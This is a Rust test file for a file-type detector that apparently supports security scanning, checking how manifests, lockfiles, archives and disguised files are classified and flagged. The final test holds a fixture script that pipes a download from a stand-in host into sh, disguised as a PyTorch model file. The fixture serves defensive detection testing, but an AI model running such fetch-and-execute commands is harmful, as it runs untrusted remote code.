//! Manifests, lockfiles and archives.

use super::*;

// ── Manifests ────────────────────────────────────────────────────

#[test]
fn package_json() {
    let det = detect(Path::new("package.json"), b"{}").unwrap();
    assert_eq!(det.file_type, FileType::PackageJson);
    assert_eq!(det.source, DetectionSource::Filename);
}

#[test]
fn package_lock_json() {
    let det = detect(Path::new("package-lock.json"), b"{}").unwrap();
    assert_eq!(det.file_type, FileType::PackageLockJson);
    assert_eq!(det.source, DetectionSource::Filename);
}

#[test]
fn composer_json() {
    assert_ext("composer.json", FileType::ComposerJson);
}

#[test]
fn cargo_toml() {
    assert_ext("Cargo.toml", FileType::CargoToml);
}

#[test]
fn pyproject_toml() {
    assert_ext("pyproject.toml", FileType::PyProjectToml);
}

#[test]
fn vsix_manifest() {
    assert_detect("extension.vsixmanifest", b"<xml/>", FileType::VsixManifest);
}

#[test]
fn chrome_manifest() {
    let data = br#"{"manifest_version": 3, "permissions": ["storage"]}"#;
    assert_detect("manifest.json", data, FileType::ChromeManifest);
}

#[test]
fn github_actions_workflow() {
    let det = detect(Path::new(".github/workflows/ci.yml"), b"name: CI\n").unwrap();
    assert_eq!(det.file_type, FileType::GithubActions);
    assert_eq!(det.source, DetectionSource::Filename);
}

#[test]
fn github_actions_workflow_by_content() {
    let data = b"name: CI\n\non: [push]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n";
    let det = detect(Path::new("ci.yml"), data).unwrap();
    assert_eq!(det.file_type, FileType::GithubActions);
    assert_eq!(det.source, DetectionSource::Heuristic);
    assert!(!det.extension_mismatch());
}

#[test]
fn github_actions_composite() {
    assert_detect("action.yml", b"name: My Action\n", FileType::GithubActions);
}

#[test]
fn systemd_service() {
    assert_detect(
        "evil.service",
        b"[Unit]\nDescription=Evil\n[Service]\nExecStart=/bin/true\n",
        FileType::SystemdService,
    );
}

#[test]
fn axml_magic_is_xml() {
    let mut doc = vec![0x03, 0x00, 0x08, 0x00, 0, 0, 0, 0, 0x01, 0x00, 0x1c, 0x00];
    let len = u32::try_from(doc.len()).unwrap().to_le_bytes();
    doc[4..8].copy_from_slice(&len);
    assert_detect("res/K1.xml", &doc, FileType::Xml);
    assert_detect("res/K1.bin", &doc, FileType::Xml);
    let mut short = doc.clone();
    short[4] = 0xff;
    // `.bin` is data by extension. A size field that does not cover the
    // buffer must not promote it to XML.
    let det = detect(Path::new("res/K1.bin"), &short).unwrap();
    assert_eq!(det.file_type, FileType::Data);
}

#[test]
fn binary_service_or_desktop_suffix_is_data() {
    // `0x01` keeps the body binary without a lane of NULs, which
    // would otherwise read as UTF-16 text and stay on the extension.
    let mut boot = vec![0x01; 512];
    boot[0] = 0xEA;
    boot[510] = 0x55;
    boot[511] = 0xAA;
    assert_detect("Virus.Boot.Stoned.Service", &boot, FileType::Data);
    assert_detect("payload.desktop", &boot, FileType::Data);
}

#[test]
fn systemd_service_drop_in() {
    assert_ext(
        "/etc/systemd/system/ssh.service.d/override.conf",
        FileType::SystemdService,
    );
}

#[test]
fn pkg_info() {
    assert_detect("PKG-INFO", b"Metadata-Version: 2.1\n", FileType::PkgInfo);
    assert_detect("METADATA", b"Metadata-Version: 2.1\n", FileType::PkgInfo);
}

#[test]
fn arch_package_metadata_files_are_text() {
    assert_detect(".PKGINFO", b"pkgname = wasm-pkg-tools\n", FileType::Text);
    assert_detect(".BUILDINFO", b"format = 2\n", FileType::Text);
    assert_detect(".MTREE", b"#mtree\n", FileType::Text);
}

// ── Archives ─────────────────────────────────────────────────────

#[test]
fn zip_archive() {
    assert_detect("data.zip", b"PK\x03\x04content", FileType::Zip);
}

#[test]
fn rar_archive() {
    assert_detect("data.rar", b"Rar!\x1a\x07\x01\x00", FileType::Rar);
}

#[test]
fn gzip_archive() {
    assert_detect("data.gz", &[0x1f, 0x8b, 0x08, 0x00], FileType::Gz);
}

#[test]
fn xz_archive() {
    assert_detect("data.xz", b"\xfd7zXZ\x00", FileType::Xz);
}

#[test]
fn bzip2_archive() {
    assert_detect("data.bz2", b"BZh91AY&SY", FileType::Bz2);
}

#[test]
fn dmg_udif_archive() {
    let mut data = vec![0u8; 2048];
    data[63..66].copy_from_slice(b"BZh");
    let trailer = data.len() - 512;
    data[trailer..trailer + 4].copy_from_slice(b"koly");
    data[trailer + 4..trailer + 8].copy_from_slice(&4u32.to_be_bytes());
    data[trailer + 8..trailer + 12].copy_from_slice(&512u32.to_be_bytes());

    assert_detect("data.dmg", &data, FileType::Dmg);
}

#[test]
fn sevenz_archive() {
    assert_detect("data.7z", b"7z\xBC\xAF\x27\x1C\x00", FileType::SevenZ);
}

#[test]
fn zstd_archive() {
    assert_detect("data.zst", &[0x28, 0xB5, 0x2F, 0xFD, 0, 0], FileType::Zst);
}

#[test]
fn freebsd_pkg_zstd_is_not_extension_mismatch() {
    let data = {
        let mut tar = tar::Builder::new(Vec::new());
        let mut h = tar::Header::new_ustar();
        h.set_path("+COMPACT_MANIFEST").unwrap();
        h.set_size(7);
        h.set_cksum();
        tar.append(&h, &b"payload"[..]).unwrap();
        zstd::encode_all(&tar.into_inner().unwrap()[..], 3).unwrap()
    };
    // FreeBSD `.pkg` (zstd tar) carries its own ecosystem type; the
    // `.pkg`→macOS extension default is a benign refinement, suppressed at
    // the FileId level where consumers read it.
    let id = FileId::from_path_and_bytes(Path::new("BerkeleyGW-4.0_2.pkg"), &data);
    assert_eq!(id.file_type(), FileType::PkgFreebsd);
    assert!(!id.extension_mismatch());
}

#[test]
fn tar_gz_by_ext() {
    assert_ext("data.tar.gz", FileType::TarGz);
    assert_ext("data.tgz", FileType::TarGz);
}

#[test]
fn deb_by_ext() {
    assert_ext("package.deb", FileType::Deb);
}

#[test]
fn gem_by_ext() {
    // A gem is an uncompressed tar with no offset-0 magic, so it resolves
    // through the extension fallback to its own type (not generic Tar).
    assert_ext("rails-7.0.4.gem", FileType::Gem);
}

#[test]
fn specialized_package_extensions() {
    // Void and Gentoo packages resolve through the extension fallback to
    // their own ecosystem types, not generic tar/tar.zst.
    assert_ext("zlib-1.3_1.x86_64.xbps", FileType::Xbps);
    assert_ext("app-1.0-1.gpkg.tar", FileType::GentooBinpkg);
    // The Arch `.pkg.tar.*` family maps to PkgArch by extension.
    assert_ext("foo-1.0-1-x86_64.pkg.tar.zst", FileType::PkgArch);
    assert_ext("foo-1.0-1-x86_64.pkg.tar.xz", FileType::PkgArch);
    assert_ext("foo-1.0-1-x86_64.pkg.tar", FileType::PkgArch);
}

#[test]
fn apk_split_is_not_an_extension_mismatch() {
    // Both `.apk` ecosystems are content-detected away from the extension's
    // zip default, but that disambiguation is benign — not an evasion flag.
    let android = FileId::from_path_and_bytes(Path::new("app.apk"), b"PK\x03\x04zip body");
    assert_eq!(android.file_type(), FileType::ApkAndroid);
    assert!(!android.extension_mismatch());

    let alpine = FileId::from_path_and_bytes(Path::new("musl.apk"), &[0x1f, 0x8b, 0x08, 0x00]);
    assert_eq!(alpine.file_type(), FileType::ApkAlpine);
    assert!(!alpine.extension_mismatch());
}

/// `detect` excuses the same format conventions `FileId` does, so the two
/// public entry points agree on whether a name is a masquerade. The type
/// the extension implies is still reported.
#[test]
fn detect_and_file_id_agree_on_benign_mismatches() {
    let elf = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    for (name, data, ext_type) in [
        ("app.apk", &b"PK\x03\x04zip body"[..], FileType::Zip),
        ("musl.apk", &[0x1f, 0x8b, 0x08, 0x00][..], FileType::Zip),
        ("._invoice.pdf", &elf[..], FileType::Pdf),
    ] {
        let det = detect(Path::new(name), data).expect("detected");
        let id = FileId::from_path_and_bytes(Path::new(name), data);
        assert_eq!(det.file_type, id.file_type(), "{name}");
        assert!(!id.extension_mismatch(), "{name}");
        assert!(!det.extension_mismatch(), "{name}");
        assert_eq!(det.extension_type(), Some(ext_type), "{name}");
    }
    // Without the AppleDouble prefix the same file is a masquerade to both.
    let det = detect(Path::new("invoice.pdf"), elf).expect("detected");
    let id = FileId::from_path_and_bytes(Path::new("invoice.pdf"), elf);
    assert!(det.extension_mismatch());
    assert!(id.extension_mismatch());
}

#[test]
fn package_types_stay_in_archive_group() {
    // Fine-grained package identity must not leak out of the coarse
    // `archive` group that downstream consumers key on.
    for ft in [
        FileType::Gem,
        FileType::GoModule,
        FileType::ApkAndroid,
        FileType::ApkAlpine,
        FileType::Npm,
        FileType::Crate,
        FileType::Conda,
        FileType::Egg,
        FileType::Nupkg,
        FileType::Ipa,
        FileType::Vsix,
        FileType::PkgMacos,
        FileType::Dmg,
        FileType::PkgFreebsd,
        FileType::PkgArch,
        FileType::PythonSdist,
        FileType::OciImage,
        FileType::Xbps,
        FileType::GentooBinpkg,
    ] {
        assert!(ft.is_archive(), "{ft:?} should be an archive");
        assert_eq!(ft.group().label(), "archives", "{ft:?} group");
    }
}

#[test]
fn rpm_by_ext() {
    assert_ext("package.rpm", FileType::Rpm);
}

#[test]
fn flatpak_groups_as_archive_but_is_not_walkable() {
    assert_eq!(FileType::Flatpak.group().label(), "archives");
    assert!(!FileType::Flatpak.is_archive());
}

#[test]
fn is_archive_returns_true_for_archives() {
    assert!(FileType::Zip.is_archive());
    assert!(FileType::TarGz.is_archive());
    assert!(FileType::Rar.is_archive());
    assert!(FileType::SevenZ.is_archive());
    assert!(FileType::Deb.is_archive());
    assert!(FileType::Jar.is_archive());
    assert!(FileType::Snap.is_archive());
    assert!(FileType::SquashFs.is_archive());
    assert!(!FileType::Elf.is_archive());
    assert!(!FileType::Python.is_archive());
}

#[test]
fn is_binary_returns_true_for_binaries() {
    assert!(FileType::Elf.is_binary());
    assert!(FileType::Pe.is_binary());
    assert!(FileType::MachO.is_binary());
    assert!(FileType::JavaClass.is_binary());
    assert!(FileType::Dex.is_binary());
    assert!(!FileType::Zip.is_binary());
    assert!(!FileType::Python.is_binary());
}

#[test]
fn is_structured_data_true_for_fully_parsed_manifests() {
    assert!(FileType::PackageJson.is_structured_data());
    assert!(FileType::CargoToml.is_structured_data());
    assert!(FileType::GithubActions.is_structured_data());
    assert!(FileType::Plist.is_structured_data());
    assert!(FileType::SrcInfo.is_structured_data());
    // Generic JSON is size-limited and may fall back to a text scan, so it
    // is deliberately *not* treated as fully-parsed structured data.
    assert!(!FileType::Json.is_structured_data());
    assert!(!FileType::Python.is_structured_data());
    assert!(!FileType::Elf.is_structured_data());
}

// ── npm lockfiles by content ─────────────────────────────────────

#[test]
fn npm_json_lock_content_versions_and_collected_names() {
    let cases: &[&[u8]] = &[
        br#"{"name":"demo","version":"1.0.0","lockfileVersion":1,"dependencies":{"x":{"version":"1.2.3"}}}"#,
        br#"{"name":"demo","version":"1.0.0","lockfileVersion":2,"packages":{"":{},"node_modules/x":{"version":"1.2.3"}},"dependencies":{}}"#,
        br#"{"name":"demo","version":"1.0.0","lockfileVersion":3,"requires":true,"packages":{"":{},"node_modules/x":{"version":"1.2.3"}}}"#,
        br#"{"lockfileVersion":3,"packages":{"node_modules/x":{"version":"1.2.3"}}}"#,
        br#"{"lockfileVersion":3,"packages":{}}"#,
    ];
    for data in cases {
        assert_eq!(
            detect_content(data).unwrap().file_type,
            FileType::PackageLockJson
        );
        for name in [
            "",
            "8a1e6ad594b0",
            "package-lock.8a1e6ad594b0.json",
            "random.json",
            "npm-shrinkwrap.json",
        ] {
            let d = detect(Path::new(name), data).unwrap();
            assert_eq!(d.file_type, FileType::PackageLockJson, "{name}");
            assert!(!d.extension_mismatch(), "{name}");
        }
        let d = detect(Path::new("unrelated.py"), data).unwrap();
        assert_eq!(d.file_type, FileType::PackageLockJson);
        assert!(d.extension_mismatch());
    }
}

#[test]
fn npm_json_lock_content_bom_whitespace_and_complete_parse() {
    let data = b"\xef\xbb\xbf  \n{\"lockfileVersion\":3,\"packages\":{}} \r\n";
    assert_eq!(
        detect_content(data).unwrap().file_type,
        FileType::PackageLockJson
    );
    for data in [
        br#"{"lockfileVersion":3,"packages":{}}; process.exit(1)"#.as_slice(),
        br#"{"lockfileVersion":3,"packages":{"" : {"name":"x"}}"#.as_slice(),
        br#"[ {"lockfileVersion":3,"packages":{}} ]"#.as_slice(),
        br#"{"message":"\"lockfileVersion\":3","packages":{}}"#.as_slice(),
        br#"{"nested":{"lockfileVersion":3,"packages":{}}}"#.as_slice(),
        br#"{"lockfileVersion":"3","packages":{}}"#.as_slice(),
        br#"{"lockfileVersion":4,"packages":{}}"#.as_slice(),
        br#"{"lockfileVersion":3,"packages":[]}"#.as_slice(),
        br#"{"lockfileVersion":3,"packages":{"x":"not a descriptor"}}"#.as_slice(),
        br#"{"lockfileVersion":3,"packages":{},"requires":"true"}"#.as_slice(),
        br#"{"lockfileVersion":3,"packages":{},"name":{}}"#.as_slice(),
        br#"{"lockfileVersion":3,"packages":{},"version":7}"#.as_slice(),
        br#"{"lockfileVersion":1,"packages":{}}"#.as_slice(),
        br#"{"name":"x","version":"1","lockfileVersion":1,"dependencies":[]}"#.as_slice(),
    ] {
        assert_ne!(
            detect_content(data).map(|d| d.file_type),
            Some(FileType::PackageLockJson),
            "{data:?}"
        );
    }
}

#[test]
fn npm_json_lock_content_does_not_hide_javascript_or_binaries() {
    let script = br#"const fixture = '{"lockfileVersion":3,"packages":{}}'; console.log(fixture);"#;
    let d = detect(Path::new("sample.js"), script).unwrap();
    assert_eq!(d.file_type, FileType::JavaScript);
    assert!(!d.extension_mismatch());
    let d = detect(
        Path::new("package-lock.abc.json"),
        b"#!/bin/sh\nprintf hello\n",
    )
    .unwrap();
    assert_eq!(d.file_type, FileType::Shell);
    assert!(d.extension_mismatch());
    let d = detect(
        Path::new("other.json"),
        br#"{"name":"x","version":"1","dependencies":{}}"#,
    )
    .unwrap();
    assert_eq!(d.file_type, FileType::Json);
}

// ── Tar members named like zips, and legacy torch pickles ───────

#[test]
fn pkgbuild_first_tar_is_not_zip_from_its_member_name() {
    let tar = include_bytes!("../testdata/pkgbuild-first.tar");
    for name in ["package.tar", "artifact", "image.zip"] {
        assert_eq!(
            FileId::from_path_and_bytes(Path::new(name), tar).file_type(),
            FileType::Tar
        );
    }
    for signature in [
        b"PK\x03\x04".as_slice(),
        b"PK\x05\x06",
        b"PK\x07\x08",
        b"PK\x06\x06",
        b"PK\x06\x07",
    ] {
        let mut bytes = signature.to_vec();
        bytes.resize(64, 0);
        assert_eq!(
            detect_content(&bytes).map(|d| d.file_type),
            Some(FileType::Zip)
        );
    }
    assert_ne!(
        detect_content(b"PKGBUILD\0\0\0\0").map(|d| d.file_type),
        Some(FileType::Zip)
    );
}

#[test]
fn legacy_torch_pickle_model_suffix_is_a_bounded_container_convention() {
    let bytes = include_bytes!("../../testdata/pickle/torch-protocol2-float-tensor.pt");
    for name in ["tensor.pt", "tensor.PTH", "tensor.ckpt", "artifact"] {
        let id = FileId::from_path_and_bytes(Path::new(name), bytes);
        assert_eq!(id.file_type(), FileType::Pickle);
        assert!(!id.extension_mismatch(), "{name}");
    }
    assert!(FileId::from_path_and_bytes(Path::new("note.txt"), bytes).extension_mismatch());
    let mut altered = bytes.to_vec();
    altered[4] ^= 1;
    assert!(FileId::from_path_and_bytes(Path::new("tensor.pt"), &altered).extension_mismatch());
    let script = b"#!/bin/sh\ncurl https://example.invalid/p | sh\n";
    let id = FileId::from_path_and_bytes(Path::new("tensor.pt"), script);
    assert_eq!(id.file_type(), FileType::Shell);
    assert!(id.extension_mismatch());
}
